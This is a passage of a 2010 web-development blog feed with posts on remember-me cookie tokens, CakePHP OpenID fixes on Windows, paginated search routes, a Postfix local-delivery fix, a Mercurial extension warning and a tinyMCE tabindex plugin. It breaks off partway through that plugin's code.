checkbox, I would try to re-authenticate him automatically.&lt;/p&gt;

&lt;p&gt;In order to do that, I had to change my implementation. The first thing to do
was creating a &lt;code&gt;UserToken&lt;/code&gt;table with 3 fields : &lt;code&gt;user_id&lt;/code&gt;, &lt;code&gt;token&lt;/code&gt;&lt;code&gt;&lt;/code&gt;and
&lt;code&gt;duration&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Then, when the user authenticate I generate a random token and save it along
the &lt;code&gt;user_id&lt;/code&gt; in a cookie.&lt;/p&gt;

&lt;p&gt;I&amp;#39;ll also populate the &lt;code&gt;UserToken&lt;/code&gt;table with the &lt;code&gt;user_id&lt;/code&gt;, a hashed version
of the token,Â  and matching the &lt;code&gt;duration&lt;/code&gt;to the expires date of the cookie.&lt;/p&gt;

&lt;p&gt;That way, the next time that the user comes to my website without a session I
check its cookie. If he has a &lt;code&gt;user_id&lt;/code&gt; and a token, I&amp;#39;ll try to authenticate
him.&lt;/p&gt;

&lt;p&gt;I&amp;#39;ll find a matching &lt;code&gt;user_id&lt;/code&gt; and hashed token. If there are no results, then
the cookie is not valid. Either it has been already used or it is a cookie
forgery attempt. In that case, I&amp;#39;ll do nothing.&lt;/p&gt;

&lt;p&gt;If there&amp;#39;s a match, I still check that the token is not expired. If it is,
I&amp;#39;ll delete it in the database, as well as clearing the cookie. On the other
hand, if the cookie is still valid, I log the user in.&lt;/p&gt;

&lt;p&gt;Once the user is loggued in I generate a new token, update the cookie and
update the table with a hashed version of it.&lt;/p&gt;

&lt;p&gt;That way each token can only be used once and are generated only when the user
correctly authenticate and are only used once the session expires.&lt;/p&gt;

&lt;h2&gt;But one can still steal cookies&lt;/h2&gt;

&lt;p&gt;Yes, a malicious user can still steal my cookie, copy it to its computer and
use the token to login. That&amp;#39;s true and as we can&amp;#39;t do anything against that,
we could still try to mitigate it.&lt;/p&gt;

&lt;p&gt;First precaution would be to disable any sensitive information edition while
loggued in using the cookie. Like bank account, personnal information,
password changing, etc.&lt;/p&gt;

&lt;p&gt;The second thing would be to check for any hacking attempt. Whenever I guess
for a forgery attempt (trying to login with a bad set of id / hashed token), I
delete all UserToken associated for this user. This will block any bruteforce
attack because even there won&amp;#39;t be any more match in the database.&lt;/p&gt;

&lt;p&gt;It is also wise to display a warning message to the user telling him that his
account may have been compromised and that he should be wary and maybe change
its password.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Using cakePHP OpenId plugin on Windows</title>
   <link href="http://blog.pixelastic.com/2010/05/21/adding-openid-support/"/>
   <updated>2010-05-21T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/05/21/adding-openid-support</id>
   <content type="html">&lt;p&gt;After all the praises I&amp;#39;ve read about OpenId, I decided to implement it in
this CMS. My goal was to set an easy way for readers to leave comments without
the need for registering to anything.&lt;/p&gt;

&lt;p&gt;I thought it would also be great to add as a secondary, and easiest, mechanism
for logging in.&lt;/p&gt;

&lt;p&gt;So I downloaded and installed the openID component by cakebaker. As I&amp;#39;m
running my dev environment under Windows, I had to set some settings.&lt;/p&gt;

&lt;h2&gt;Fixing the pluginPath&lt;/h2&gt;

&lt;p&gt;I&amp;#39;ve save the OpenId component in a plugin, and it has a clever mechanism to
import the PHP OpenId library based on the folder it is saved.&lt;/p&gt;

&lt;p&gt;Unfortunatly, the regexp used to know the name of the current plugin was
throwing errors on Windows, due to the backslashes used in the file path.&lt;/p&gt;

&lt;p&gt;I updated the &lt;code&gt;getPluginName()&lt;/code&gt; method to this new one and it did the trick :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;private function getPluginName() {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $result = array();&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $ds = (Folder::isWindowsPath(__FILE__)) ? &amp;#39;\\\\&amp;#39; : DS;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  if (preg_match(&amp;#39;#&amp;#39;.$ds.&amp;#39;plugins&amp;#39;.$ds.&amp;#39;(.*)&amp;#39;.$ds.&amp;#39;controllers#&amp;#39;, __FILE__, $result)) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;      return $result[1];&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  }&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;  return false;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  }&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Basically it makes sure that the backslashes are correctly escaped under
Windows.&lt;/p&gt;

&lt;p&gt;Edit : I&amp;#39;ve sent this patch to the OpenId component author and it is now fixed
in the latest versions.&lt;/p&gt;

&lt;h2&gt;Generating randomness&lt;/h2&gt;

&lt;p&gt;The second fix was to change the &lt;code&gt;Auth_OpenID_RAND_SOURCE&lt;/code&gt; constant to &lt;code&gt;null&lt;/code&gt;.
This constant enable the library to generate randomness (AFAIK), by using the
&lt;code&gt;/dev/urandom&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;This does not exists on Windows, so I added the following lines in my
&lt;code&gt;bootstrap.php&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;if (Folder::isWindowsPath(__FILE__)) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    define(&amp;#39;Auth_OpenID_RAND_SOURCE&amp;#39;, null);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Connecting to SSL servers&lt;/h2&gt;

&lt;p&gt;The PHP bundle on Windows comes with &lt;code&gt;cURL&lt;/code&gt;already builtin, but without the
bundle of the X.509 certificates of public CA. It means that the OpenId PHP
library will refuse to connect to any CA using an SSL connection because it
won&amp;#39;t be able to check the certificate.&lt;/p&gt;

&lt;p&gt;This does not happens on Linux, the list is correctly built in.&lt;/p&gt;

&lt;p&gt;Fortunatly, we can pass a &lt;code&gt;CURLOPT_CAINFO&lt;/code&gt; option to &lt;code&gt;cURL&lt;/code&gt; to manually set a
pre-defined bundle, and there already is one shipped with the PHP OpenId
library.&lt;/p&gt;

&lt;p&gt;All you have to do is add the following line on line 93 of the
&lt;code&gt;vendors/Auth/Yadis/ParanoidHTTPFetcher.php&lt;/code&gt; file :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;curl_setopt($c, CURLOPT_CAINFO, str_replace(&amp;#39;\\&amp;#39;, &amp;#39;/&amp;#39;, dirname(__FILE__)).&amp;#39;/../OpenID/ca-bundle.crt&amp;#39;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
 </entry>
 
 <entry>
   <title>Paginated search results and custom url</title>
   <link href="http://blog.pixelastic.com/2010/05/19/paginated-search-results-and-custom-url/"/>
   <updated>2010-05-19T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/05/19/paginated-search-results-and-custom-url</id>
   <content type="html">&lt;p&gt;I wanted for this blog a search feature, but I had some prerequisites for it :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The search url could be bookmarked&lt;/li&gt;
&lt;li&gt;It should be paginated&lt;/li&gt;
&lt;li&gt;It should play well with my custom url starting with /blog&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;Defining custom urls&lt;/h2&gt;

&lt;p&gt;Here are the two routes I defined in my routes.php&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;Router::connect(&amp;#39;/blog/search/:keyword&amp;#39;,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;Â Â Â  array(&amp;#39;controller&amp;#39; =&amp;gt; &amp;#39;posts&amp;#39;, &amp;#39;action&amp;#39; =&amp;gt; &amp;#39;search&amp;#39;),&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;Â Â Â  array(&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;Â Â Â  Â Â Â  &amp;#39;pass&amp;#39; =&amp;gt; array(&amp;#39;keyword&amp;#39;),&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;Â Â Â  Â Â Â  &amp;#39;keyword&amp;#39; =&amp;gt; &amp;#39;[^/]+&amp;#39;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;Â Â Â  )&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;Router::connect(&amp;#39;/blog/search/*&amp;#39;, array(&amp;#39;controller&amp;#39; =&amp;gt; &amp;#39;posts&amp;#39;, &amp;#39;action&amp;#39; =&amp;gt; &amp;#39;search&amp;#39;));&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Going to&lt;code&gt;/blog/search/*keyword*&lt;/code&gt; will start a search on the keyword, while
going to &lt;code&gt;/blog/search/&lt;/code&gt;would display a search form.&lt;/p&gt;

&lt;h2&gt;Writing the method&lt;/h2&gt;

&lt;p&gt;I started by creating a &lt;code&gt;search&lt;/code&gt;action in my &lt;code&gt;PostController&lt;/code&gt;, then creating
a form submitting to this action, with a &lt;code&gt;keyword&lt;/code&gt;input field.&lt;/p&gt;

&lt;p&gt;In the &lt;code&gt;search&lt;/code&gt;method, the first thing I do is checking if some POST data is
submitted (coming from the search form). If so, I redirect to the same page,
but passing the &lt;code&gt;keyword&lt;/code&gt;as first parameter.&lt;/p&gt;

&lt;p&gt;If no &lt;code&gt;keyword&lt;/code&gt;is passed nor data submitted, I&amp;#39;ll display a simple search
form.&lt;/p&gt;

&lt;p&gt;And finally if a &lt;code&gt;keyword&lt;/code&gt;is specified, I&amp;#39;ll do a paginated search on every
posts whose &lt;code&gt;name&lt;/code&gt;or &lt;code&gt;text&lt;/code&gt;contains the &lt;code&gt;keyword&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;function search() {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // We redirect to get it in GET mode&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  if (!empty($this-&amp;gt;data)) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    return $this-&amp;gt;redirect(array(&amp;#39;keyword&amp;#39; =&amp;gt; urlencode($this-&amp;gt;data[&amp;#39;Post&amp;#39;][&amp;#39;keyword&amp;#39;])));&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  }&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;  // Search index&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  if (empty($keyword)) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    return $this-&amp;gt;render(&amp;#39;search_index&amp;#39;);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  }&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;  // Adding conditions to name and text&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $keyword = urldecode($keyword);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $this-&amp;gt;paginate = Set::merge(&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    $this-&amp;gt;paginate,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    array(&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;      &amp;#39;conditions&amp;#39; =&amp;gt; array(&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;#39;AND&amp;#39; =&amp;gt; array(&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;          &amp;#39;OR&amp;#39; =&amp;gt; array(&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;            &amp;#39;Post.name LIKE&amp;#39; =&amp;gt; &amp;#39;%&amp;#39;.$keyword.&amp;#39;%&amp;#39;,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;            &amp;#39;Post.text LIKE&amp;#39; =&amp;gt; &amp;#39;%&amp;#39;.$keyword.&amp;#39;%&amp;#39;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;          )&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        )&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;      )&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    )&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  );&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // Getting paginated result&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $itemList = $this-&amp;gt;paginate();&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;  $this-&amp;gt;set(array(&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;#39;keyword&amp;#39; =&amp;gt; $keyword,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;#39;itemList&amp;#39; =&amp;gt; $itemList&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  ));&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
 </entry>
 
 <entry>
   <title>Unable to send mail to same server</title>
   <link href="http://blog.pixelastic.com/2010/05/15/unable-to-send-mail-to-same-server/"/>
   <updated>2010-05-15T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/05/15/unable-to-send-mail-to-same-server</id>
   <content type="html">&lt;p&gt;I just realized that one of my domains was sending mails (in PHP), but I never
actually received them.&lt;/p&gt;

&lt;p&gt;I first tested the mail adress, sending mails from a personal adress. I then
tested the &lt;code&gt;mail()&lt;/code&gt; php function, sending mail to a personal adress. But all
that was working fine.&lt;/p&gt;

&lt;p&gt;But sending mails in PHP on www.server.com to name@server.com did nothing. No
mail, no error.&lt;/p&gt;

&lt;h2&gt;Damn you Gmail&lt;/h2&gt;

&lt;p&gt;After some digging it appears that local mails (to addresses on the same
server) were using some sort of special local delivery.&lt;/p&gt;

&lt;p&gt;I recently moved the whole mail handling stuff from this server to Google
Apps, but I forgot to remove/edit the postfix configuration file so the local
delivery routine was still up and local mails where internally routed.&lt;/p&gt;

&lt;p&gt;So, I just had to edit the &lt;code&gt;/etc/postfix/main.cf&lt;/code&gt; file, find the
&lt;code&gt;mydestination&lt;/code&gt;line and remove any reference to my server here.&lt;/p&gt;

&lt;p&gt;Then, just restart postfix by doing a&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;postfix restart
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;It still doesn&amp;#39;t work&lt;/h2&gt;

&lt;p&gt;In my case, it still didn&amp;#39;t change anything... That&amp;#39;s when I understood that
postfix was using a &lt;code&gt;vmail&lt;/code&gt; mysql database to check for existing domains.&lt;/p&gt;

&lt;p&gt;I renamed the &lt;code&gt;domain&lt;/code&gt;field value in the &lt;code&gt;domains&lt;/code&gt;table, and I can now
correctly receive mails.&lt;/p&gt;

&lt;h2&gt;But, I have lost a lot of mails !&lt;/h2&gt;

&lt;p&gt;No you don&amp;#39;t, as they are routed by the local delivery system, they should be
somewhere on your hard drive. In my case it was in the &lt;code&gt;/home/mailusers/&lt;/code&gt;
directory&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>"failed to import extension hgext.imerge" warning on Dreamhost</title>
   <link href="http://blog.pixelastic.com/2010/05/14/failed-to-import-extension-hgext-imerge-warning-on-dreamhost/"/>
   <updated>2010-05-14T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/05/14/failed-to-import-extension-hgext-imerge-warning-on-dreamhost</id>
   <content type="html">&lt;p&gt;Trying to push some new code to a Hg repository on my Dreamhost account, I had
the following error message :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;remote: *** failed to import extension hgext.imerge: No module named imerge
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I used to have the same kind of issues with an other extensions,
&lt;code&gt;hgext/hbisect&lt;/code&gt; a while ago and I fixed it by forcing Hg to not use this
extension.&lt;/p&gt;

&lt;p&gt;Here&amp;#39;s how :&lt;/p&gt;

&lt;p&gt;Edit your &lt;code&gt;.hgrc&lt;/code&gt; file and under the &lt;code&gt;[extensions]&lt;/code&gt; category, add
&lt;code&gt;hgext.imerge=!&lt;/code&gt;, like this&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ini&quot; data-lang=&quot;ini&quot;&gt;&lt;span class=&quot;k&quot;&gt;[extensions]&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;hgext/hbisect&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;!&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;hgext.imerge&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;!&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This should stop the warning.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Tabindexing and inserting tabs with tinyMCE</title>
   <link href="http://blog.pixelastic.com/2010/05/12/tabindexing-and-inserting-tabs-with-tinymce/"/>
   <updated>2010-05-12T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/05/12/tabindexing-and-inserting-tabs-with-tinymce</id>
   <content type="html">&lt;p&gt;You may have noticed that you can&amp;#39;t press tab to jump from field to field in a
form that uses tinyMCE. There is a plugin named &lt;code&gt;tabfocus&lt;/code&gt;in the core that is
here to allow just that.&lt;/p&gt;

&lt;p&gt;But it does not seem to work correctly if you already have tabindex values
defined on your inputs. So I decided to code my own.&lt;/p&gt;

&lt;p&gt;I choose the easiest way, letting the browser do most of the job. I only
copied the textarea &lt;code&gt;tabindex&lt;/code&gt;value to the create iframe and it did the
trick.&lt;/p&gt;

&lt;p&gt;I created a tinyMCE for that, here the code of the init() method. By the way,
I&amp;#39;m using the jQuery version of tinyMCE.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;nx&quot;&gt;init&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// We set a tabindex value to the iframe instead of the initial textarea&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onInit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;editorId&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;editorId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;textarea&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;#&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;editorId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;#&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;editorId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;_ifr&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;tabindex&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;textarea&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;tabindex&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;textarea&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;tabindex&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;What it does is grabbing the initial &lt;code&gt;tabindex&lt;/code&gt;value of your textarea and
setting it to the tinyMCE iframe. You have to wrap this in &lt;code&gt;onInit.add&lt;/code&gt;
because at the time the plugin &lt;code&gt;init&lt;/code&gt;method is called, the iframe is not yet
created. I also removed the &lt;code&gt;tabindex&lt;/code&gt;value from the original textarea, two
elements aren&amp;#39;t supposed to have the same &lt;code&gt;tabindex&lt;/code&gt;value.&lt;/p&gt;

&lt;p&gt;This method does not work in Chrome. Chrome always add a tab character when
you press the tab key in a tinyMCE editor, it does not jump to the next
tabindexed element. Is that a good behavior ? I don&amp;#39;t know, it surely is
useful to be able to insert tab characters, but it also is useful to tab
through the whole form.&lt;/p&gt;

&lt;h2&gt;Listening to the tab key&lt;/h2&gt;

&lt;p&gt;Anyway, I decided to hook on the &lt;code&gt;keyDown&lt;/code&gt;event and listen to the tab key
being pressed. This way I could manually jump focus to the next field when tab
is pressed, or insert a tab character when Shift+Tab is pressed (for example).&lt;/p&gt;

&lt;p&gt;I used the tinyMCE event helper methods and wrote this (just add it right
after the previous &lt;code&gt;editor.onInit.add&lt;/code&gt; code) :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;c1&quot;&gt;// We hook on the tab key. One press will jump to the next focusable field. Maj+tab will insert a tab&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onKeyDown&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// We only listen for the tab key&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;keyCode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Â Â Â &lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// Shift + tab will insert a tab&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;shiftKey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;execCommand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;mceInsertContent&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;\t&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;tinymce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cancel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// Just pressing tab will jump to the next element&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tabindex&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;#&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;editorId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;_ifr&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;tabindex&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
